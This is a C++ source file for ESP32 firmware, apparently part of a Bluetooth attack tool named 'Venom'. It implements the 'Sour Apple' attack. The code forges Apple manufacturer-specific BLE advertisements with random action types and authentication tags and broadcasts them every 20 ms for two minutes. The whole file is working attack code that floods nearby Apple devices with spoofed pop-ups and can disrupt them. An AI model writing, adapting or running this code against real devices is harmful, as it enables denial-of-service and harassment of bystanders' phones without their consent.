#include "sourapple.h"
#include "web.h"

NimBLEAdvertising *pAdvertising;
NimBLEServer *pServer;

void initializeSourApple()
{
    NimBLEDevice::init("Venom");
    pServer = NimBLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
}

NimBLEAdvertisementData getOAdvertisementData()
{
    NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
    uint8_t packet[17];
    uint8_t size = 17;
    uint8_t i = 0;

    packet[i++] = size - 1; // Packet Length
    packet[i++] = 0xFF;     // Packet Type (Manufacturer Specific)
    packet[i++] = 0x4C;     // Packet Company ID (Apple, Inc.)
    packet[i++] = 0x00;     // ...
    packet[i++] = 0x0F;     // Type
    packet[i++] = 0x05;     // Length
    packet[i++] = 0xC1;     // Action Flags
    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    packet[i++] = types[rand() % sizeof(types)]; // Action Type
    esp_fill_random(&packet[i], 3);              // Authentication Tag
    i += 3;
    packet[i++] = 0x00; // ???
    packet[i++] = 0x00; // ???
    packet[i++] = 0x10; // Type ???
    esp_fill_random(&packet[i], 3);

    randomAdvertisementData.addData(std::string((char *)packet, 17));
    return randomAdvertisementData;
}

void startSourApple()
{
    sendStringToClient("Sour Apple Started !");
    initializeSourApple();
    unsigned long prMillis = millis();
    unsigned long maxAttackDuration = 120000;
    do
    {
        delay(20);
        NimBLEAdvertisementData advertisementData = getOAdvertisementData();
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
        delay(20);
        pAdvertising->stop();
    } while (millis() - prMillis < maxAttackDuration);
    BLEDevice::deinit(true);
    sendStringToClient("Sour Apple Stopped !");
}